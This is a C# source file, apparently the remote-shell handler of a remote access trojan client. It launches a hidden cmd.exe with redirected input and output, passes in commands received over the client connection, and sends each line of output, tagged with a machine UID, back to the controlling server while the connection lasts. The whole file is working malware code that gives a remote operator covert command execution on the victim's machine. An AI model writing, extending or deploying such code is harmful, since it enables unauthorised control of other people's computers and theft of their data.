using Client.Connection;
using Client.Things;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

namespace Client.Handlers
{
    internal class HandleShell
    {
        private static Process Process { get; set; }
        private static bool IsRunning { get; set; }
        public static void StartShell()
        {
            Process = new Process()
            {
                StartInfo = new ProcessStartInfo("cmd")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardInput = true,
                    RedirectStandardError = true,
                    WorkingDirectory = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))
                }
            };
            Process.OutputDataReceived += ShellDataHandler;
            Process.ErrorDataReceived += ShellDataHandler;
            Process.Start();
            Process.BeginOutputReadLine();
            Process.BeginErrorReadLine();
            while (SillyClient.isConnected())
            {
                Thread.Sleep(800);
            }
            StopShell();
        }
        public static void StopShell()
        {
            if (Process == null) return;
            Process.OutputDataReceived -= ShellDataHandler;
            Process.ErrorDataReceived -= ShellDataHandler;
            Process.Kill();
            Process = null;
        }
        public static void CmdShell(string cmd)
        {
            Process.StandardInput.WriteLine(cmd);
        }

        private static void ShellDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder Output = new StringBuilder();
            try
            {
                Output.AppendLine(e.Data);
                Stuff.Pack pak = new Stuff.Pack();
                pak.Set("Packet", "Shell");
                pak.Set("UID", UID.Get());
                pak.Set("Output", Output.ToString());

                SillyClient.Send(pak.Pacc());
            }
            catch { }
        }
    }
}
